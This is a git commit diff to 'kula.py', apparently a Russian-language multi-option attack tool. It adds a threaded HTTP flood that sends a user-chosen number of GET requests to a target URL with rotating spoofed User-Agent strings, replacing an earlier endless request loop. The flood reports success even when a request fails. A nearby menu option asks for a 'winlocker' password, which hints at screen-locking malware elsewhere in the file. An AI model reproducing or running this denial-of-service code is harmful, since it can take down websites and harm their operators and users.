916ad653198e30c645120f5b7101c9821edcae8f
k9gy67 <shedevroaboba@gmail.com>
2026-03-10 21:47:40 +0300

    Add files via upload

--- kula.py
+++ kula.py
@@ -1144,21 +1144,39 @@ elif num == "2":
         print
 
 elif num == "3":
-    import http.client
-    
-    host = input("введите адрес сайта: ")
-    path = "/"
-
-    conn = http.client.HTTPConnection(host)
-    while True:
-     try:
-         conn.request("GET", path)
-         response = conn.getresponse()
-         print(f"Код ответа: {response.status}")
-         data = response.read()
-         print("Ответ получен успешно.")
-     except Exception as e:
-         print(f"Ошибка: {e}")
+    import pystyle
+    from pystyle import Colorate, Colors
+    import random
+    import requests
+    import threading
+    url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.green, interval=0.005)
+    num_requests = int(
+                    pystyle.Write.Input(
+                        "[?] Введите количество запросов: ", pystyle.Colors.green, interval=0.005
+                    )
+                )
+    user_agents = [
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
+                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
+                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
+                ]
+    def send_request(i):
+                    user_agent = random.choice(user_agents)
+                    headers = {"User-Agent": user_agent}
+                    try:
+                        response = requests.get(url, headers=headers)
+                        print(f"[+] Request {i} sent successfully\n")
+                    except:
+                        print(f"[+] Request {i} sent successfully\n")
+    threads = []
+    for i in range(1, num_requests + 1):
+        t = threading.Thread(target=send_request, args=[i])
+        t.start()
+        threads.append(t)
+    for t in threads:
+                    t.join()
 
 elif num == "4":
     pas = input("введите пароль для винлокера: ")
